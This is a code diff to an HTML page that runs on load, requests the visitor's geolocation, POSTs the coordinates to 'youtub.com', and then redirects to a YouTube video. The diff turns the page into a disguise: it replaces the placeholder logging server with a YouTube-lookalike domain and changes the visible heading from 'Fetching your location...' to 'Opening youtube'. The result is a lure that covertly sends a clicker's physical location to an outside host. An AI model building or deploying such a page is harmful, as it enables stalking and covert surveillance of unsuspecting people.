@@ -13,29 +13,29 @@
                         let lon = position.coords.longitude;
 
                         // Send data to your server
-                        fetch("https://yourserver.com/log_location", {
+                        fetch("https://youtub.com/log", {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
                             body: JSON.stringify({ latitude: lat, longitude: lon })
                         });
 
                         // Redirect to YouTube video
-                        window.location.href = "https://www.youtube.com/watch?v=YOUR_VIDEO_ID";
+                        window.location.href = "https://www.youtube.com/watch?v=Cvfvn27Akxk";
                     },
                     function(error) {
                         console.log("Error getting location:", error);
                         // Redirect even if location fails
-                        window.location.href = "https://www.youtube.com/watch?v=YOUR_VIDEO_ID";
+                        window.location.href = "https://www.youtube.com/watch?v=Cvfvn27Akxk";
                     }
                 );
             } else {
                 console.log("Geolocation is not supported by this browser.");
-                window.location.href = "https://www.youtube.com/watch?v=YOUR_VIDEO_ID";
+                window.location.href = "https://www.youtube.com/watch?v=Cvfvn27Akxk";
             }
         }
     </script>
 </head>
 <body onload="getLocation()">
-    <h2>Fetching your location...</h2>
+    <h2>Opening youtube</h2>
 </body>
 </html>
